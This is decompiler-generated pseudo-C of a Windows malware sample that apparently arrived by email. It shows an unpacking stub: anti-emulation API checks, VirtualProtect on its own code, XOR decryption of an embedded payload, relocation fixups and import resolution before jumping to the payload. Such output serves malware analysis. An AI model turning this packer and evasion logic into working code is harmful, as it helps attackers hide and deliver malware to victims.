// subject.c
// Generated on 5/4/2015 1:13:22 AM by decompiling malware_via_email/malware_0469/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 edx, word32 ebx, word32 esi, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 ebp_15 = 0x00000000
	branch AddUsersToEncryptedFile(0x00000000, 0x00000000) != 0x00000000 l00401029
l00401028:
	return
l00401029:
	Mem28[fp - 0x00000024:word32] = 0xFFFFFFFF
	Mem30[fp - 0x00000028:word32] = 0xFFFFFFFF
	branch AreAllAccessesGranted(0x00000000, 0x00000000) != 0x00000000 l0040103F
l00401037:
	Mem320[fp - 0x00000008:word32] = 0x0000002B
l0040103F:
	Mem38[fp - 0x00000024:word32] = fp - 0x0000000C
	Mem40[fp - 0x00000028:word32] = 0x00000040
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	Mem48[fp - 0x00000010:word32] = 0x000000E3
	word32 eax_49 = 0x00000000
l00401060:
	branch ebp_15 != 0x00000025 l0040106B
l00401069:
	ebp_15 = 0x00000000
l0040106B:
	Mem72[eax_49 + 0x004015C8:byte] = Mem48[ebp_15 + 0x00404000:byte] ^ Mem48[eax_49 + 0x004015C8:byte] ^ 0xCA
	eax_49 = eax_49 + 0x00000001
	ebp_15 = ebp_15 + 0x00000001
	branch eax_49 <u 0x00001440 l00401060
l00401093:
	Mem79[fp - 0x00000010:word32] = 0x000000E4
	word32 ecx_257 = 0x00000000
	word32 edi_262 = 0x004028C8
	word32 dwLoc04_255 = 0x00000000
	branch false l00401124
l004010B9:
l004010C0:
	word32 eax_263 = Mem79[edi_262 + 0x00000004:word32]
	word32 esi_270 = edi_262 + 0x00000008
	branch eax_263 - 0x00000008 >>u 0x00000001 <= 0x00000000 l00401111
l004010D2:
	word32 dwLoc08_285 = eax_263 - 0x00000008 >>u 0x00000001
l004010E0:
	branch (Mem79[esi_270 + 0x00000000:word16] & 0xF000) != 0x3000 l00401103
l004010F2:
	word32 eax_312 = ((word32) Mem79[esi_270 + 0x00000000:word16] & 0x00000FFF) + Mem79[edi_262 + 0x00000000:word32]
	Mem315[eax_312 + 0x00401348:word32] = Mem79[eax_312 + 0x00401348:word32] + 0xF0401348
l00401103:
	word32 v20_302 = dwLoc08_285 - 0x00000001
	esi_270 = esi_270 + 0x00000002
	dwLoc08_285 = v20_302
	branch v20_302 != 0x00000000 l004010E0
l0040110D:
	ecx_257 = dwLoc04_255
l00401111:
	ecx_257 = ecx_257 + Mem79[edi_262 + 0x00000004:word32]
	dwLoc04_255 = ecx_257
	edi_262 = edi_262 + Mem79[edi_262 + 0x00000004:word32]
	branch ecx_257 <u 0x000000E4 l004010C0
l00401124:
	branch Mem79[0x004020C4:word32] == 0x00000000 l004011A0
	word32 esi_106 = 0x004020B4
	word32 dwLoc08_107 = 0x004020B4
	esi_132 = esi_106
	branch Mem79[0x004020C4:word32] == 0x00000000 l004011A0
l00401137:
	word32 esi_132
	branch LoadLibraryA(Mem79[esi_132 + 0x0000000C:word32] + 0x00401348) == 0x00000000 l00401193
	word32 eax_147 = LoadLibraryA(Mem79[esi_132 + 0x0000000C:word32] + 0x00401348)
	branch eax_147 == 0x00000000 l00401193
l00401149:
	branch Mem79[esi_132 + 0x00000000:word32] != 0x00000000 l00401152
	word32 edi_173 = Mem79[esi_132 + 0x00000000:word32]
	branch edi_173 != 0x00000000 l00401152
l0040114F:
	edi_173 = Mem79[esi_132 + 0x00000010:word32]
l00401152:
	word32 eax_179 = Mem79[edi_173 + 0x00401348:word32]
	word32 edi_180 = edi_173 + 0x00401348
	word32 esi_181 = Mem79[esi_132 + 0x00000010:word32] + 0x00401348
	byte S_184 = cond(eax_179)
	branch eax_179 == 0x00000000 l0040118F
l00401160:
	word32 eax_222
	branch S_184 l00401172
l00401162:
	eax_222 = GetProcAddress(eax_147, (word32) Mem79[edi_180 + 0x00000000:word16])
	goto l00401181
l00401172:
	eax_222 = GetProcAddress(eax_147, eax_179 + 0x0040134A)
l00401181:
	Mem226[esi_181 + 0x00000000:word32] = eax_222
	edi_180 = edi_180 + 0x00000004
	eax_179 = Mem226[edi_180 + 0x00000000:word32]
	esi_181 = esi_181 + 0x00000004
	S_184 = cond(eax_179) (alias)
	branch eax_179 != 0x00000000 l00401160
l0040118F:
	esi_132 = dwLoc08_107
l00401193:
	esi_132 = esi_132 + 0x00000014
	dwLoc08_107 = esi_132
	branch Mem79[esi_132 + 0x00000010:word32] != 0x00000000 l00401137
l004011A0:
	call 0x00401DA8 (retsize: 4; depth: 36)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

